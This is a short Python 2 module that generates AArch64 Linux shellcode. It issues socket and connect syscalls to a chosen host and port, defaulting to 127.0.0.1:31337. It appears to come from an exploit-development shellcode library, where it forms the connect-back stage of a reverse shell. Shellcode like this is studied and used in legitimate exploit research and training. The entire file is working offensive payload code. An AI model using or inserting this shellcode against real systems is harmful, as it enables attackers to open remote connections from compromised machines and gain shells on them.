from socket import htons, inet_aton, gethostbyname
from struct import unpack

def binary_ip(host):
    return inet_aton(gethostbyname(host))

def u32(u):
    return unpack("<I", u)[0]

def generate(host='127.0.0.1', port=31337):
    """Connects to remote machine on specific port

    Args:
        host(str): hostname or IP address

        port(int/str): specific port
    """

    sc = """
    /* socket(...) */
    mov x0, 2
    mov x1, 1
    sub x2, x2, x2
    mov x8, 198
    svc 1
    adr x1, sockaddr_1
    #mov x1, pc
    #add x1, 12
    mov x2, 16
    mov x6, x0
    b after_sockaddr_2
    sub x1, x1, x1

sockaddr_1:
    .short 0x0002
    .short %s
    .word  %s
    
after_sockaddr_2:
    mov x8, 203
    svc 1
    """ % (htons(int(port)), u32(binary_ip(host)))
    return sc

if __name__ == '__main__':
    print generate()
